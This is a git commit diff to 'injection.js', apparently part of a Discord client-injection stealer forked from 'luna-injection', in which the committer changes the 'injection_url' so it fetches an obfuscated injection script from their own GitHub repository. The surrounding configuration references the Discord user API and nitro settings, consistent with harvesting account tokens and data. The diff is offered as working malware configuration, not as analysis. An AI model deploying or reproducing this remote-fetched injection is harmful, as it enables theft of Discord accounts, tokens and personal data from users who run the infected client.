7a47be626c7266b1847a34d3ea634a40b0738316
Jazzrox12 <75812492+Jazzrox12@users.noreply.github.com>
2023-08-24 17:51:45 +0100

    Update injection.js

--- injection.js
+++ injection.js
@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Jazz Injection', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1134248299780657245/1144310810848542771/jazzrox12.gif?size=4096'.replace(/ /g, '%20'),
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js', 
+  injection_url: 'https://raw.githubusercontent.com/Jazzrox12/Jazz-injection/main/obfuscated-injection.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
